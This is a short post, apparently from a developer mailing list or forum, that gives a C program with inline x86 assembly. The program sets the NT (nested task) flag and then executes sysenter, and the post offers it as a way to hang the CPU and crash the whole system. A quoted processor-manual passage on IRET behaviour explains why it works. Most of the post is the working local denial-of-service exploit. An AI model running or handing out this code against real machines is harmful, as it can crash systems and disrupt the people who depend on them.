Here's a way to heat up your cpu and crash the rest of the system too:
main(){
asm("pushf\n"
        "popl %eax\n"
/* enable the NT bit */
        "orl $0x4000, %eax\n"
        "pushl %eax\n"
        "popf\n"
        "sysenter\n"
       );
return 0;
}
"If NT equals 1, IRET reverses the operation of a CALL or INT that
caused a task switch. The updated state of the task executing IRET is
saved in its task state segment. If the task is reentered later, the
code that follows IRET is executed."
